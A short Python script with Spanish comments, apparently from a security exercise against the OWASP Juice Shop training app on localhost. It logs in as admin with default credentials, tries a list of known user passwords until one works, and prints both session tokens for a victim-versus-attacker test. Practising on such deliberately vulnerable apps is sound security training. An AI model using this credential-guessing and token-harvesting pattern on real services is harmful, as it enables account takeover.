import requests

def login(email, password):
    r = requests.post(
        "http://localhost:3001/rest/user/login",
        json={"email": email, "password": password},
        timeout=10
    )
    print(f"Login {email}:{password} -> HTTP {r.status_code}")
    if r.status_code == 200:
        return r.json()["authentication"]["token"]
    return None

# Víctima: admin (siempre funciona)
victim = login("admin@juice-sh.op", "admin123")

# Atacante: probar varios candidatos hasta que uno funcione
attacker = None
candidatos = [
    ("jim@juice-sh.op", "ncc1701"),
    ("bender@juice-sh.op", "Oh4mmY0uL1k3Th4t?"),
    ("demo", "demo"),
    ("test@juice-sh.op", "test"),
    ("uvogin@juice-sh.op", "s3cr3t"),
]

for email, pwd in candidatos:
    if attacker:
        break
    attacker = login(email, pwd)

print("\n--- COPIA ESTOS DOS VALORES ---")
print("VICTIM_TOKEN=" + (victim or "FALLO"))
print("ATTACKER_TOKEN=" + (attacker or "FALLO"))